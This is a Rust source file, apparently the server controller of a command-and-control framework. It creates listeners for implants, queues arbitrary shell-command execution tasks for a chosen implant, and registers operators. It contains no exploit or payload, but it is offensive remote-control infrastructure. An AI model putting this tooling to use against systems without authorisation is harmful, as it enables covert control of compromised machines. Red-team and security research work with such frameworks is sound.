use crate::server::{db, net};
use crate::share::{implantpb, operatorpb, Error};
use db::entities::tasks;
use std::sync::Arc;
use tokio::sync::mpsc::Receiver;
use tokio::sync::Mutex;

use operatorpb::listeners_request::ListenersCommand;

pub struct Controller {
    db: Arc<Mutex<db::Db>>,
}

impl Controller {
    pub fn new(db: Arc<Mutex<db::Db>>) -> Controller {
        Controller { db }
    }

    pub async fn listenerctl(
        &self,
        request: operatorpb::ListenersRequest,
    ) -> Result<operatorpb::ListenersResponse, Error> {
        let req = request
            .listeners_command
            .ok_or_else(|| Error::ListenerStartErr("".to_string(), 0))?;

        let response = match req {
            ListenersCommand::NewListener(new_listener) => {
                // Create a new listener
                let listener = new_listener
                    .listener
                    .ok_or_else(|| Error::ListenerStartErr("".to_string(), 0))?;

                let ip = listener
                    .lhost
                    .parse()
                    .map_err(|_| Error::InvalidIP(listener.lhost))?;

                let addr = std::net::SocketAddr::new(ip, listener.lport as u16);
                let listener = net::implant_server::Listener::new(
                    addr,
                    Arc::clone(&self.db),
                    new_listener.server_pem,
                    new_listener.server_key,
                )?;

                // Add the listener to the db
                self.db.lock().await.listeners.push(listener);

                operatorpb::ListenersResponse {
                    listeners_command: Some(
                        operatorpb::listeners_response::ListenersCommand::NewListener(
                            operatorpb::Empty {},
                        ),
                    ),
                }
            }

            // List existing listeners
            ListenersCommand::ListListeners(_) => {
                let listeners = self
                    .db
                    .lock()
                    .await
                    .listeners
                    .iter()
                    .map(|l| operatorpb::Listener {
                        id: l.uuid.to_string(),
                        lhost: l.lhost.clone(),
                        lport: l.lport as u32,
                    })
                    .collect();

                operatorpb::ListenersResponse {
                    listeners_command: Some(
                        operatorpb::listeners_response::ListenersCommand::ListListeners(
                            operatorpb::ListListeners { listeners },
                        ),
                    ),
                }
            }
        };
        Ok(response)
    }

    pub async fn taskctl(
        &self,
        request: operatorpb::NewTaskRequest,
    ) -> Result<operatorpb::Empty, Error> {
        // Create the response to send
        let task = implantpb::TaskResponse {
            task_id: uuid::Uuid::new_v4().to_string(),
            task_payload: Some(implantpb::task_response::TaskPayload::ExecTask(
                implantpb::ExecBody { cmd: request.cmd },
            )),
            task_type: implantpb::TaskType::ExecTask as i32,
        };

        // Store the task in the db
        let task = tasks::Task {
            implant_id: request.implantid,
            operator_id: request.operatorid,
            task,
        };

        self.db.lock().await.add_task(task);
        Ok(operatorpb::Empty {})
    }

    pub async fn implantctl(&self) -> Result<operatorpb::ImplantsResponse, Error> {
        let uuids = self.db.lock().await.list_implants().await?;
        let response = operatorpb::ImplantsResponse { implants: uuids };
        Ok(response)
    }

    // The server always has an operator id of "0"
    pub async fn register_server(&self) -> operatorpb::Confirmation {
        let operator_id = self.db.lock().await.register_server();
        operatorpb::Confirmation { operator_id }
    }

    // Register an operator
    pub async fn register(&self) -> operatorpb::Confirmation {
        let operator_id = self.db.lock().await.register_operator();
        operatorpb::Confirmation { operator_id }
    }

    // Set up a notification channel for an operator
    pub async fn notifications(
        &self,
        confirmation: operatorpb::Confirmation,
    ) -> Receiver<Result<operatorpb::Notification, tonic::Status>> {
        self.db
            .lock()
            .await
            .init_notifications(confirmation.operator_id)
    }
}
